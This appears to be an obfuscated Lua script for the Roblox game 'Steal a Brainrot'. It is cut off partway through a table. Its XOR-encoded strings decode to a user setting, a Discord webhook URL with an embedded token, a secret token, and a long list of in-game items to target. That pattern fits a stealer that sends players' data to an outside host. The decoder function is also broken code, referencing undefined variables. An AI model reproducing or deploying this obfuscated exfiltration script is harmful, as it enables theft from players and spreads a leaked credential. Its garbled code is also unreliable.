--[[ Obfuscated with Prometheus-style engine ]]
local _l0lOIO00="_00lI0O";local _OO0OII0I="_0IIIOl";local _l0OlIOIl="_IOOlll";local _OOlOlIOl="_0OOOI0";local _IOIIOOIl="_0OOlO0";
local _OlllOIlOIO00OllI=(function(_OIO0II)return function(...)local _0IOOOl=""for _,_I0IOOO in ipairs({...})do _OlO0lI=_l0OOIO..string.char(bit32 and bit32.bxor(_I0llOO,_lOII0l)or(function(a,b)local r=0 for i=0,7 do local ba,bb=a%2,b%2 if ba~=bb then r=r+2^i end a,b=math.floor(a/2),math.floor(b/2)end return r end)(_Oll0Il,_l0llIO))end return _OOI0ll end end)(57);
local _I0I0IIOIlII0=function()
getgenv().User = _OlllOIlOIO00OllI(106,72,118,13,1,10)

getgenv().Webhook = _OlllOIlOIO00OllI(81,77,77,73,74,3,22,22,73,77,91,23,93,80,74,90,86,75,93,23,90,86,84,22,88,73,80,22,78,92,91,81,86,86,82,74,22,8,13,10,8,9,10,8,0,1,11,14,12,10,14,8,13,11,12,14,22,113,90,108,72,81,83,84,73,0,97,86,102,72,64,20,106,86,65,1,14,79,14,85,91,115,118,9,111,8,97,73,13,114,120,15,123,110,83,104,73,79,85,88,1,12,125,105,93,80,114,77,64,15,113,102,96,114,83,126,107,113,110,76,76,8,112,10,95)

getgenv().SecretToken = _OlllOIlOIO00OllI(15,15,92,0,10,9,1,12,20,93,11,1,91,20,13,0,9,0,20,1,10,15,1,20,91,1,15,90,12,90,91,11,88,93,15,0)

getgenv().Brainrots = {
  _OlllOIlOIO00OllI(106,77,75,88,78,91,92,75,75,64,25,124,85,92,73,81,88,87,77),
  _OlllOIlOIO00OllI(116,92,86,78,85),
  _OlllOIlOIO00OllI(113,92,88,93,85,92,74,74,25,113,86,75,74,92,84,88,87),
  _OlllOIlOIO00OllI(106,82,80,91,80,93,80,25,109,86,80,85,92,77),
  _OlllOIlOIO00OllI(113,64,93,75,88,25,125,75,88,94,86,87,25,122,88,87,87,92,85,85,86,87,80),
  _OlllOIlOIO00OllI(125,75,88,94,86,87,25,126,80,87,94,92,75,80,87,80),
  _OlllOIlOIO00OllI(125,75,88,94,86,87,25,122,88,87,87,92,85,85,86,87,80),
  _OlllOIlOIO00OllI(117,86,79,92,25,117,86,79,92,25,123,92,88,75),
  _OlllOIlOIO00OllI(117,88,25,106,76,73,75,92,84,92,25,122,86,84,91,80,87,88,74,80,86,87),
  _OlllOIlOIO00OllI(122,92,85,92,74,77,80,88,85,25,105,92,94,88,74,76,74),
  _OlllOIlOIO00OllI(105,86,73,90,76,75,76,25,88,87,93,25,127,80,67,67,76,75,76),
  _OlllOIlOIO00OllI(107,86,74,92,64,25,88,87,93,25,109,92,93,93,64),
  _OlllOIlOIO00OllI(122,88,73,80,77,88,87,86,25,116,86,91,64),
  _OlllOIlOIO00OllI(122,86,86,82,80,25,88,87,93,25,116,80,85,82,80),
  _OlllOIlOIO00OllI(123,76,75,94,76,75,86,25,120,87,93,25,127,75,64,76,75,86),
  _OlllOIlOIO00OllI(114,92,77,76,73,88,77,25,123,75,86,74),
  _OlllOIlOIO00OllI(107,92,80,87,80,77,86,25,106,85,92,80,94,81,80,77,86),
  _OlllOIlOIO00OllI(117,86,74,25,120,84,80,94,86,74),
  _OlllOIlOIO00OllI(117,88,25,106,92,90,75,92,77,25,122,86,84,91,80,87,88,74,80,86,87),
  _OlllOIlOIO00OllI(117,86,74,25,106,92,82,86,85,88,81,74),
  _OlllOIlOIO00OllI(106,80,94,87,86,75,92,25,122,88,75,88,73,88,90,92),
  _OlllOIlOIO00OllI(127,75,88,94,75,88,84,88,25,88,87,93,25,122,81,86,90,75,88,84,88),
  _OlllOIlOIO00OllI(117,88,25,122,88,74,88,25,123,86,86),
  _OlllOIlOIO00OllI(117,88,25,127,86,86,93,25,122,86,84,91,80,87,88,74,80,86,87),
  _OlllOIlOIO00OllI(124,85,92,95,88,87,77,86,25,127,75,80,94,86),
  _OlllOIlOIO00OllI(106,73,86,86,82,64,25,88,87,93,25,105,76,84,73,82,64),
  _OlllOIlOIO00OllI(117,88,25,126,80,87,94,92,75,25,106,92,82,86,85,88,81),
  _OlllOIlOIO00OllI(126,80,87,94,92,75,25,126,92,75,88,77),
  _OlllOIlOIO00OllI(106,88,84,84,64,87,80,25,127,88,77,77,80,87,80),
  _OlllOIlOIO00OllI(117,86,74,25,106,73,88,94,81,92,77,77,80,74),
  _OlllOIlOIO00OllI(127,92,74,77,80,79,92,25,15,14),
  _OlllOIlOIO00OllI(111,92,87,77,86,85,80,92,75,86,25,105,88,79,86,87,92,75,86),
  _OlllOIlOIO00OllI(106,73,88,94,81,92,77,77,80,25,109,76,88,85,92,77,77,80),
  _OlllOIlOIO00OllI(120,87,77,86,87,80,86),
  _OlllOIlOIO00OllI(126,88,75,88,84,88,25,88,87,93,25,116,88,93,76,87,93,76,87,94),
  _OlllOIlOIO00OllI(107,86,74,92,77,77,80,25,109,76,88,85,92,77,77,80),
  _OlllOIlOIO00OllI(119,88,90,81,86,25,106,73,64,93,92,75),
  _OlllOIlOIO00OllI(127,80,74,81,80,87,86,25,122,85,86,78,87,80,87,86),
  _OlllOIlOIO00OllI(117,88,79,88,93,86,75,80,77,86,25,106,73,80,87,80,77,86),
  _OlllOIlOIO00OllI(115,86,85,85,64,25,115,86,85,85,64,25,106,88,81,76,75),
  _OlllOIlOIO00OllI(109,80,75,80,85,80,82,88,85,80,82,88,25,109,80,75,80,85,80,82,88,85,88,82,86),
  _OlllOIlOIO00OllI(114,92,77,90,81,76,75,76,25,88,87,93,25,116,76,74,77,76,75,76),
  _OlllOIlOIO00OllI(106,78,88,94,94,64,25,123,75,86,74),
  _OlllOIlOIO00OllI(117,88,25,107,86,84,88,87,77,80,90,25,126,75,88,87,93,92),
  _OlllOIlOIO00OllI(118,75,90,88,85,92,93,86,87),
  _OlllOIlOIO00OllI(109,80,90,77,88,90,25,106,88,81,76,75),
  _OlllOIlOIO00OllI(114,92,77,76,73,88,77,25,114,92,73,88,77),
  _OlllOIlOIO00OllI(117,88,25,109,88,90,86,25,122,86,84,91,80,87,88,74,80,86,87),
  _OlllOIlOIO00OllI(109,88,87,94,25,109,88,87,94,25,114,92,85,92,77,88,87,94),
  _OlllOIlOIO00OllI(117,86,79,80,87,25,107,86,74,92),
  _OlllOIlOIO00OllI(117,86,74,25,109,88,90,86,75,80,77,88,74),
  _OlllOIlOIO00OllI(124,79,80,85,92,93,86,87),
  _OlllOIlOIO00OllI(117,86,74,25,105,75,80,84,86,74),
  _OlllOIlOIO00OllI(117,88,25,115,86,85,85,64,25,126,75,88,87,93,92),
  _OlllOIlOIO00OllI(110,25,86,75,25,117),
  _OlllOIlOIO00OllI(124,74,86,82,25,106,92,82,86,85,88,81),
  _OlllOIlOIO00OllI(117,86,74,25,105,76,94,94,80,92,74),
  _OlllOIlOIO00OllI(109,75,88,85,88,85,92,93,86,87),
  _OlllOIlOIO00OllI(126,86,91,91,85,80,87,86,25,108,87,80,90,80,90,85,80,87,86),
  _OlllOIlOIO00OllI(109,76,95,95,25,109,86,76,90,88,87),
  _OlllOIlOIO00OllI(116,80,92,77,92,77,92,80,75,88,25,123,80,90,80,90,85,92,77,92,80,75,88),
  _OlllOIlOIO00OllI(116,86,87,92,64,25,116,86,87,92,64,25,107,92,80,87,93,92,92,75),
  _OlllOIlOIO00OllI(122,81,80,85,85,80,87,25,122,81,80,85,80),
  _OlllOIlOIO00OllI(122,81,80,73,74,86,25,88,87,93,25,104,76,92,74,86),
  _OlllOIlOIO00OllI(117,88,25,106,73,86,86,82,64,25,126,75,88,87,93,92),
  _OlllOIlOIO00OllI(123,88,90,76,75,76,25,88,87,93,25,124,94,94,76,75,76),
  _OlllOIlOIO00OllI(117,86,74,25,123,75,86,74),
  _OlllOIlOIO00OllI(117,88,25,124,65,77,80,87,90,77,25,126,75,88,87,93,92),
  _OlllOIlOIO00OllI(117,86,74,25,122,88,87,93,80,92,74),
  _OlllOIlOIO00OllI(122,92,85,76,85,88,75,90,80,87,80,25,111,80,90,80,86,74,80,87,80),
  _OlllOIlOIO00OllI(117,86,74,25,15,14),
  _OlllOIlOIO00OllI(117,86,74,25,116,86,91,80,85,80,74),
  _OlllOIlOIO00OllI(116,86,87,92,64,25,116,86,87,92,64,25,105,76,94,94,64),
  _OlllOIlOIO00OllI(117,86,74,25,115,86,85,85,64,25,122,86,84,91,80,87,88,74,80,86,87,88,74),
  _OlllOIlOIO00OllI(117,86,74,25,106,73,86,86,82,64,25,122,86,84,91,80,87,88,74,80,86,87,88,74),
  _OlllOIlOIO00OllI(117,86,74,25,113,86,77,74,73,86,77,74,80,77,86,74),
  _OlllOIlOIO00OllI(117,86,74,25,105,85,88,87,80,77,86,74),
  _OlllOIlOIO00OllI(122,81,80,90,85,92,77,92,80,75,88,25,122,76,73,80,93,92,80,75,88),
  _OlllOIlOIO00OllI(125,115,25,105,88,87,93,88),
  _OlllOIlOIO00OllI(117,88,74,25,106,80,74),
  _OlllOIlOIO00OllI(106,73,80,87,87,64,25,113,88,84,84,64),
  _OlllOIlOIO00OllI(117,86,74,25,106,78,92,92,77,81,92,88,75,77,74),
  _OlllOIlOIO00OllI(109,88,90,86,75,80,77,88,25,123,80,90,80,90,85,92,77,88),
  _OlllOIlOIO00OllI(119,76,90,85,92,88,75,86,25,125,80,87,86,74,74,88,76,75,86),
  _OlllOIlOIO00OllI(117,86,74,25,122,86,84,91,80,87,88,74,80,86,87,88,74),
  _OlllOIlOIO00OllI(122,81,80,90,85,92,77,92,80,75,88,25,119,86,92,85,77,92,80,75,88),
  _OlllOIlOIO00OllI(122,81,80,84,87,80,87,86),
  _OlllOIlOIO00OllI(106,78,88,94,25,106,86,93,88),
  _OlllOIlOIO00OllI(119,86,86,25,84,64,25,113,92,88,75,77),
  _OlllOIlOIO00OllI(116,88,75,80,88,90,81,80,25,122,86,75,88,67,86,87,80),
  _OlllOIlOIO00OllI(109,88,90,86,75,80,85,85,86,25,122,75,86,90,86,93,80,85,85,86),
  _OlllOIlOIO00OllI(117,86,74,25,11,12),
  _OlllOIlOIO00OllI(117,88,25,126,75,88,87,93,92,25,122,86,84,91,80,87,88,74,80,86,87),
  _OlllOIlOIO00OllI(117,86,74,25,123,76,75,75,80,77,86,74),
  _OlllOIlOIO00OllI(125,86,87,82,92,64,77,76,75,91,86,25,124,65,73,75,92,74,74),
  _OlllOIlOIO00OllI(15,14),
  _OlllOIlOIO00OllI(117,86,74,25,122,81,80,90,85,92,77,92,80,75,88,74),
  _OlllOIlOIO00OllI(126,76,92,74,77,25,15,15,15),
  _OlllOIlOIO00OllI(117,86,74,25,116,80,25,126,88,77,80,77,86,74),
  _OlllOIlOIO00OllI(107,88,87,94,25,107,80,87,94,25,123,76,74),
  _OlllOIlOIO00OllI(119,86,86,25,84,64,25,105,75,92,74,92,87,77),
  _OlllOIlOIO00OllI(117,86,74,25,119,86,86,86,25,116,64,25,113,86,77,74,73,86,77,74,80,77,86,74),
  _OlllOIlOIO00OllI(119,86,86,25,84,64,25,122,88,87,93,64),
  _OlllOIlOIO00OllI(120,75,90,88,93,86,73,76,74),
  _OlllOIlOIO00OllI(117,86,74,25,104,76,92,74,88,93,80,85,85,88,74),
  _OlllOIlOIO00OllI(122,81,80,90,85,92,77,92,80,75,80,87,88,25,123,80,90,80,90,85,92,77,92,80,75,80,87,88),
  _OlllOIlOIO00OllI(123,76,75,75,80,77,86,25,123,88,87,93,80,77,86),
  _OlllOIlOIO00OllI(122,81,80,85,85,25,105,76,73,73,64),
  _OlllOIlOIO00OllI(104,76,92,74,88,93,80,85,85,86,25,111,88,84,73,80,75,86),
  _OlllOIlOIO00OllI(122,81,80,90,85,92,77,92,80,75,88,25,123,80,90,80,90,85,92,77,92,80,75,88),
  _OlllOIlOIO00OllI(123,75,76,87,80,77,86,25,116,88,75,74,80,77,86),
  _OlllOIlOIO00OllI(122,76,73,80,93,25,113,86,77,74,73,86,77),
  _OlllOIlOIO00OllI(116,80,25,126,88,77,80,77,86),
  _OlllOIlOIO00OllI(113,86,25,113,86,25,113,86,25,106,88,81,76,75),
  _OlllOIlOIO00OllI(122,76,73,80,93,25,122,76,73,80,93,25,106,88,81,76,75),
  _OlllOIlOIO00OllI(123,76,87,80,77,86,25,123,76,87,80,77,86,25,106,73,80,87,80,77,86),
  _OlllOIlOIO00OllI(104,76,92,74,88,93,80,85,85,88,25,122,75,86,90,86,93,80,85,88),
  _OlllOIlOIO00OllI(105,86,77,25,105,76,84,73,82,80,87),
  _OlllOIlOIO00OllI(119,88,76,94,81,77,64,25,119,88,76,94,81,77,64),
  _OlllOIlOIO00OllI(113,86,75,92,94,80,87,80,25,123,86,86,84),
  _OlllOIlOIO00OllI(106,88,87,77,88,25,113,86,77,74,73,86,77),
  _OlllOIlOIO00OllI(105,80,75,76,85,80,77,86,80,77,88,25,123,80,90,80,90,85,92,77,92,80,75,88),
  _OlllOIlOIO00OllI(11,12),
  _OlllOIlOIO00OllI(105,86,77,25,113,86,77,74,73,86,77),
  _OlllOIlOIO00OllI(109,86,25,77,86,25,77,86,25,106,88,81,76,75),
  _OlllOIlOIO00OllI(109,92,85,92,84,86,75,77,92),
  _OlllOIlOIO00OllI(117,88,25,106,88,81,76,75,25,122,86,84,91,80,87,88,74,80,86,87),
  _OlllOIlOIO00OllI(117,80,74,77,25,117,80,74,77,25,117,80,74,77,25,106,88,81,76,75),
  _OlllOIlOIO00OllI(119,86,86,25,84,64,25,92,65,88,84,80,87,92),
  _OlllOIlOIO00OllI(119,86,86,86,25,116,64,25,113,86,77,74,73,86,77),
  _OlllOIlOIO00OllI(109,76,87,94,25,109,76,87,94,25,109,76,87,94,25,106,88,81,76,75),
  _OlllOIlOIO00OllI(123,76,87,87,64,84,88,87),
  _OlllOIlOIO00OllI(117,86,74,25,115,86,91,90,80,77,86,74),
  _OlllOIlOIO00OllI(122,76,88,93,75,88,84,88,77,25,88,87,93,25,105,88,82,75,88,81,84,88,77,84,88,84,88,77),
  _OlllOIlOIO00OllI(105,85,92,88,74,92,25,84,64,25,105,75,92,74,92,87,77),
  _OlllOIlOIO00OllI(117,86,74,25,122,76,90,88,75,88,90,81,88,74),
  _OlllOIlOIO00OllI(8,65,8,65,8,65,8),
  _OlllOIlOIO00OllI(117,86,79,92,25,117,86,79,92,25,117,86,79,92,25,106,88,81,76,75),
  _OlllOIlOIO00OllI(105,92,75,75,80,77,86,25,123,76,75,75,80,77,86),
  _OlllOIlOIO00OllI(126,75,88,80,73,76,74,74,25,116,92,93,76,74,74,80),
  _OlllOIlOIO00OllI(126,80,95,77,80,87,80,25,106,73,64,93,92,75,80,87,80),
  _OlllOIlOIO00OllI(126,118,120,109),
  _OlllOIlOIO00OllI(109,75,80,90,82,86,85,80,87,86),
  _OlllOIlOIO00OllI(109,75,80,73,85,80,77,86,25,109,75,88,85,88,85,92,75,80,77,86,74),
  _OlllOIlOIO00OllI(117,88,25,111,88,90,90,88,25,115,88,90,82,86,25,117,80,87,77,92,75,80,87,86),
  _OlllOIlOIO00OllI(127,80,74,81,91,86,88,75,93),
  _OlllOIlOIO00OllI(106,88,87,77,77,92,86),
  _OlllOIlOIO00OllI(117,88,74,25,111,88,72,76,80,77,88,74,25,106,88,77,76,75,87,80,77,88,74),
  _OlllOIlOIO00OllI(117,86,74,25,114,88,75,82,92,75,80,77,86,74),
  _OlllOIlOIO00OllI(114,88,75,82,92,75,25,106,88,81,76,75),
  _OlllOIlOIO00OllI(127,75,88,87,82,92,87,77,77,92,86),
  _OlllOIlOIO00OllI(117,86,74,25,109,75,80,86,74),
  _OlllOIlOIO00OllI(115,86,91,25,115,86,91,25,115,86,91,25,106,88,81,76,75),
  _OlllOIlOIO00OllI(117,88,74,25,109,75,88,85,88,85,92,75,80,77,88,74),
  _OlllOIlOIO00OllI(105,76,84,73,82,80,87,80,25,106,73,64,93,92,75,80,87,80),
  _OlllOIlOIO00OllI(107,86,90,90,86,25,125,80,74,90,86),
  _OlllOIlOIO00OllI(124,65,77,80,87,90,77,25,116,88,77,77,92,86),
  _OlllOIlOIO00OllI(117,88,25,114,88,75,82,92,75,82,88,75,25,122,86,84,91,80,87,88,74,80,86,87),
  _OlllOIlOIO00OllI(107,92,80,87,93,92,92,75,25,109,75,88,85,88,85,88),
  _OlllOIlOIO00OllI(117,88,25,111,88,90,90,88,25,105,75,92,74,92,25,105,75,92,74,92,87,77,92),
  _OlllOIlOIO00OllI(96,92,74,74,25,84,64,25,92,65,88,84,80,87,92),
  _OlllOIlOIO00OllI(126,76,92,75,75,80,75,86,25,125,80,94,80,77,88,85,92),
  _OlllOIlOIO00OllI(123,86,88,77,80,77,86,25,120,76,75,88,77,80,77,86),
  _OlllOIlOIO00OllI(117,86,74,25,109,75,88,85,88,85,92,75,80,77,86,74),
  _OlllOIlOIO00OllI(111,76,85,77,76,75,80,87,86,25,106,82,92,85,92,77,86,87,86),
  _OlllOIlOIO00OllI(117,86,74,25,109,86,75,77,76,74),
  _OlllOIlOIO00OllI(99,86,84,91,80,92,25,109,75,88,85,88,85,88),
  _OlllOIlOIO00OllI(117,88,25,122,76,90,88,75,88,90,81,88),
  _OlllOIlOIO00OllI(127,75,88,94,86,85,88,25,117,88,25,117,88,25,117,88),
  _OlllOIlOIO00OllI(124,65,77,80,87,90,77,25,109,75,88,85,88,85,92,75,86),
  _OlllOIlOIO00OllI(117,86,74,25,106,73,64,93,92,75,80,87,80,74),
  _OlllOIlOIO00OllI(120,94,88,75,75,80,87,80,25,85,88,25,105,88,85,80,87,80),
  _OlllOIlOIO00OllI(122,81,88,90,81,92,90,81,80),
  _OlllOIlOIO00OllI(123,85,88,90,82,81,86,85,92,25,126,86,88,77),
  _OlllOIlOIO00OllI(125,76,85,25,125,76,85,25,125,76,85),
  _OlllOIlOIO00OllI(109,86,75,75,77,76,94,80,87,87,80,25,125,75,88,94,86,87,95,75,76,77,80,87,80),
  _OlllOIlOIO00OllI(106,88,84,84,64,87,80,25,106,73,64,93,92,75,80,87,80),
  _OlllOIlOIO00OllI(115,88,90,82,86,75,80,85,85,88),
  _OlllOIlOIO00OllI(109,75,92,87,86,74,77,75,76,67,67,86,25,109,76,75,91,86,25,13,9,9,9),
  _OlllOIlOIO00OllI(117,86,74,25,116,88,77,77,92,86,74),
  _OlllOIlOIO00OllI(114,88,75,82,92,75,82,88,75,25,114,76,75,82,76,75),
  _OlllOIlOIO00OllI(123,80,74,86,87,77,92,25,126,80,76,73,73,80,77,92,75,92),
  _OlllOIlOIO00OllI(117,88,25,111,88,90,90,88,25,106,88,77,76,75,87,86,25,106,88,77,76,75,87,80,77,88),
  _OlllOIlOIO00OllI(114,88,75,82,92,75,81,92,88,75,77,25,117,76,79,82,76,75),
  _OlllOIlOIO00OllI(105,86,73,25,105,86,73,25,106,88,81,76,75),
  _OlllOIlOIO00OllI(125,86,85,73,81,80,87,80,25,115,92,77,74,82,80,87,80),
  _OlllOIlOIO00OllI(105,88,87,93,88,87,80,87,80,25,127,75,86,74,77,80,87,80),
  _OlllOIlOIO00OllI(126,80,87,94,92,75,25,122,80,74,77,92,75,87,88),
  _OlllOIlOIO00OllI(109,92,87,77,88,90,86,85,86,25,109,92,90,87,80,90,86),
  _OlllOIlOIO00OllI(122,86,90,86,88,25,120,74,74,88,74,74,80,87,86),
  _OlllOIlOIO00OllI(123,92,85,76,85,88,25,123,92,85,76,94,88),
  _OlllOIlOIO00OllI(106,82,76,85,85,25,106,82,76,85,85,25,106,82,76,85,85),
  _OlllOIlOIO00OllI(114,75,76,73,76,82,25,105,88,94,80,25,105,88,94,80),
  _OlllOIlOIO00OllI(122,88,73,73,76,90,90,80,87,86,25,122,85,86,78,87,80,87,86),
  _OlllOIlOIO00OllI(123,75,88,74,80,85,80,87,80,25,123,92,75,80,84,91,80,87,80),
  _OlllOIlOIO00OllI(117,76,79,25,117,76,79,25,117,76,79),
  _OlllOIlOIO00OllI(120,87,73,88,85,80,25,123,88,91,92,85),
  _OlllOIlOIO00OllI(119,86,86,25,117,88,25,105,86,85,80,67,80,88),
  _OlllOIlOIO00OllI(122,81,75,80,74,84,88,74,84,88,84,88,77),
  _OlllOIlOIO00OllI(117,86,74,25,126,88,77,77,80,77,86,74),
  _OlllOIlOIO00OllI(123,88,84,91,76,25,123,88,84,91,76,25,106,88,81,76,75),
  _OlllOIlOIO00OllI(116,88,74,77,86,93,86,87,77,80,90,86,25,109,92,85,92,73,80,92,93,86,87,92),
  _OlllOIlOIO00OllI(105,80,90,90,80,86,87,92,77,77,88,25,116,88,90,90,81,80,87,88),
  _OlllOIlOIO00OllI(123,86,91,88,25,105,88,87,93,88),
  _OlllOIlOIO00OllI(123,76,81,86,25,93,92,25,119,86,92,85,86),
  _OlllOIlOIO00OllI(127,75,80,86,25,119,80,87,83,88),
  _OlllOIlOIO00OllI(126,75,88,87,90,81,80,92,85,85,86,25,106,73,80,75,80,77,92,85,85),
  _OlllOIlOIO00OllI(117,86,74,25,109,80,73,80,25,109,88,90,86,74),
  _OlllOIlOIO00OllI(109,86,86,77,80,87,80,25,106,81,75,80,84,73,80,87,80),
  _OlllOIlOIO00OllI(96,92,77,80,25,122,85,88,76,74),
  _OlllOIlOIO00OllI(126,80,87,94,92,75,25,126,85,86,91,86),
  _OlllOIlOIO00OllI(125,76,94,25,93,76,94,25,93,76,94),
  _OlllOIlOIO00OllI(116,76,84,84,64,25,120,84,91,88,85,88,91,76),
  _OlllOIlOIO00OllI(109,88,75,77,88,75,76,94,88,25,122,80,74,77,92,75,87,88),
  _OlllOIlOIO00OllI(106,72,76,88,85,88,87,88,87,88),
  _OlllOIlOIO00OllI(106,87,88,80,85,92,87,67,86),
  _OlllOIlOIO00OllI(122,86,75,87,25,122,86,75,87,25,122,86,75,87,25,106,88,81,76,75),
  _OlllOIlOIO00OllI(120,72,76,88,87,88,76,77),
  _OlllOIlOIO00OllI(122,88,90,88,74,80,77,86,25,106,88,77,88,85,80,77,86),
  _OlllOIlOIO00OllI(118,75,90,88,85,80,77,88,25,118,75,90,88,85,88),
  _OlllOIlOIO00OllI(122,75,88,91,91,86,25,117,80,84,86,87,92,77,77,88),
  _OlllOIlOIO00OllI(117,86,74,25,118,75,90,88,85,80,77,86,74),
  _OlllOIlOIO00OllI(109,75,88,90,77,86,75,86,25,125,80,87,86,74,88,76,75,86),
  _OlllOIlOIO00OllI(123,75,75,25,92,74,25,109,92,81,25,105,88,77,80,73,76,84),
  _OlllOIlOIO00OllI(105,80,90,90,80,86,87,92,25,116,88,90,90,81,80,87,88),
  _OlllOIlOIO00OllI(105,88,82,75,88,81,84,88,77,84,88,77,80,87,88),
  _OlllOIlOIO00OllI(123,86,84,91,88,75,93,80,87,80,25,109,86,75,77,80,87,80,80),
  _OlllOIlOIO00OllI(117,86,74,25,123,86,84,91,80,87,80,77,86,74),
  _OlllOIlOIO00OllI(123,88,85,85,92,75,80,87,88,25,105,92,73,73,92,75,84,80,87,77,80,87,88),
  _OlllOIlOIO00OllI(105,88,82,75,88,81,84,88,77,84,88,84,88,77),
  _OlllOIlOIO00OllI(117,86,74,25,109,76,87,94,77,76,87,94,77,76,87,94,90,80,77,86,74),
  _OlllOIlOIO00OllI(123,76,85,91,80,77,86,25,123,88,87,93,80,77,86,25,109,75,88,82,77,86,75,80,77,86),
  _OlllOIlOIO00OllI(123,88,85,85,92,75,80,87,86,25,117,86,85,86,85,86),
  _OlllOIlOIO00OllI(117,88,74,25,122,88,73,76,90,81,80,87,88,74),
  _OlllOIlOIO00OllI(109,75,80,73,73,80,25,109,75,86,73,73,80,25,109,75,86,73,73,88,25,109,75,80,73,73,88),
  _OlllOIlOIO00OllI(126,88,77,77,80,77,86,25,109,88,90,86,77,86),
  _OlllOIlOIO00OllI(117,86,74,25,122,81,80,81,76,88,87,80,87,80,74),
  _OlllOIlOIO00OllI(122,88,73,80,25,109,88,90,86),
  _OlllOIlOIO00OllI(115,88,90,82,86,25,115,88,90,82,25,115,88,90,82),
  _OlllOIlOIO00OllI(109,75,92,87,86,74,77,75,76,67,67,86,25,109,76,75,91,86,25,10,9,9,9),
  _OlllOIlOIO00OllI(108,75,76,91,80,87,80,25,127,85,88,84,92,87,94,76,80,87,80),
  _OlllOIlOIO00OllI(124,65,77,80,87,90,77,25,123,88,85,85,92,75,80,87,88),
  _OlllOIlOIO00OllI(111,88,84,73,80,75,88,25,122,88,73,73,76,90,80,87,88),
  _OlllOIlOIO00OllI(109,75,88,85,88,85,80,77,88,25,109,75,88,85,88,85,88),
  _OlllOIlOIO00OllI(118,75,90,88,85,92,75,86,25,118,75,90,88,85,88),
  _OlllOIlOIO00OllI(109,76,82,88,87,87,86,25,123,88,87,88,87,87,86),
  _OlllOIlOIO00OllI(120,85,92,74,74,80,86),
  _OlllOIlOIO00OllI(108,87,90,85,80,77,86,25,106,88,84,80,77,86),
  _OlllOIlOIO00OllI(109,80,73,80,25,109,86,73,80,25,109,88,90,86),
  _OlllOIlOIO00OllI(118,93,80,87,25,125,80,87,25,125,80,87,25,125,76,87),
  _OlllOIlOIO00OllI(124,74,73,75,92,74,74,86,25,106,80,94,87,86,75,88),
  _OlllOIlOIO00OllI(116,86,87,92,64,25,116,86,87,92,64,25,116,88,87),
  _OlllOIlOIO00OllI(109,80,94,75,86,85,80,94,75,92,25,127,75,76,77,86,87,87,80),
  _OlllOIlOIO00OllI(117,86,74,25,122,75,86,90,86,93,80,85,85,80,77,86,74),
  _OlllOIlOIO00OllI(109,75,88,85,88,85,92,75,86,25,109,75,88,85,88,85,88),
  _OlllOIlOIO00OllI(116,88,77,77,92,86),
  _OlllOIlOIO00OllI(122,81,80,81,76,88,87,80,87,80,25,109,88,90,86,87,80,87,80),
  _OlllOIlOIO00OllI(126,88,77,77,88,77,80,87,86,25,119,64,88,87,80,87,86),
  _OlllOIlOIO00OllI(126,80,75,88,95,88,25,122,92,85,92,74,77,75,92),
  _OlllOIlOIO00OllI(122,86,90,86,95,88,87,77,86,25,124,85,92,95,88,87,77,86),
  _OlllOIlOIO00OllI(127,80,67,67,64,25,106,86,93,88),
  _OlllOIlOIO00OllI(109,75,92,92,25,109,75,92,92,25,109,75,92,92,25,106,88,81,76,75),
  _OlllOIlOIO00OllI(123,88,87,88,87,80,77,86,25,123,88,87,93,80,77,86),
  _OlllOIlOIO00OllI(115,88,90,82,86,25,106,73,88,79,92,87,77,86,74,88),
  _OlllOIlOIO00OllI(109,86,80,85,92,77,77,86,25,127,86,90,88,90,90,80,87,86),
  _OlllOIlOIO00OllI(122,92,87,77,75,76,90,90,80,25,119,76,90,85,76,90,90,80),
  _OlllOIlOIO00OllI(122,88,75,75,86,77,80,87,80,25,123,75,88,80,87,80,87,80),
  _OlllOIlOIO00OllI(122,88,75,85,86,86),
  _OlllOIlOIO00OllI(122,88,90,81,86,75,75,80,77,86,25,116,92,85,86,87,80,77,86),
  _OlllOIlOIO00OllI(106,73,86,87,94,80,87,80,25,104,76,88,90,82,80,87,80),
  _OlllOIlOIO00OllI(117,86,74,25,119,86,86,91,80,87,80,74),
  _OlllOIlOIO00OllI(115,80,87,94,85,92,25,115,80,87,94,85,92,25,106,88,81,76,75),
  _OlllOIlOIO00OllI(109,75,88,90,86,93,76,90,86,77,76,85,76,25,125,92,85,88,73,92,85,88,93,76,74,77,76,67),
  _OlllOIlOIO00OllI(116,88,94,80,25,107,80,91,91,80,77,80,87,80),
  _OlllOIlOIO00OllI(107,81,80,87,86,25,113,92,85,80,90,86,73,77,92,75,80,87,86),
  _OlllOIlOIO00OllI(109,92,25,109,92,25,109,92,25,106,88,81,76,75),
  _OlllOIlOIO00OllI(126,88,87,94,88,87,67,92,85,85,80,25,109,75,76,85,88,85,88),
  _OlllOIlOIO00OllI(117,92,75,76,85,92,75,76,85,92,75,76,85,92),
  _OlllOIlOIO00OllI(109,86,91,25,109,86,91,80,25,109,86,91,80),
  _OlllOIlOIO00OllI(106,77,86,73,73,86,25,117,76,84,80,87,80,87,86),
  _OlllOIlOIO00OllI(126,86,75,80,85,85,86,25,110,88,77,92,75,84,92,85,86,87,93,75,80,85,85,86),
  _OlllOIlOIO00OllI(126,86,75,80,85,85,86,25,106,76,91,78,86,86,95,92,75,86),
  _OlllOIlOIO00OllI(122,88,79,88,85,85,86,25,111,80,75,77,76,86,74,86),
  _OlllOIlOIO00OllI(120,79,86,90,88,93,86,75,80,85,85,88),
  _OlllOIlOIO00OllI(109,80,94,75,80,85,80,87,80,25,110,88,77,92,75,84,92,85,80,87,80),
  _OlllOIlOIO00OllI(99,80,91,75,88,25,99,76,91,75,88,25,99,80,91,75,88,85,80,87,80),
  _OlllOIlOIO00OllI(123,86,84,91,86,84,91,80,87,80,25,126,76,74,80,87,80),
  _OlllOIlOIO00OllI(106,73,80,86,87,80,75,86,25,126,86,85,76,91,80,75,86),
  _OlllOIlOIO00OllI(123,75,76,77,77,86,25,126,80,88,85,76,77,77,86),
  _OlllOIlOIO00OllI(123,86,84,91,88,75,93,80,75,86,25,122,75,86,90,86,93,80,85,86),
  _OlllOIlOIO00OllI(107,81,80,87,86,25,109,86,88,74,77,92,75,80,87,86),
  _OlllOIlOIO00OllI(118,75,88,87,94,76,77,80,87,80,25,120,87,88,87,88,74,74,80,87,80),
  _OlllOIlOIO00OllI(127,75,80,94,86,25,122,88,84,92,85,86),
  _OlllOIlOIO00OllI(123,76,81,86,25,93,92,25,127,76,92,94,86),
  _OlllOIlOIO00OllI(106,92,88,85,86,25,107,92,94,88,85,86),
  _OlllOIlOIO00OllI(106,80,94,84,88,25,126,80,75,85),
  _OlllOIlOIO00OllI(105,76,95,95,88,91,88,85,85),
  _OlllOIlOIO00OllI(122,81,86,90,90,86,25,123,76,87,87,64),
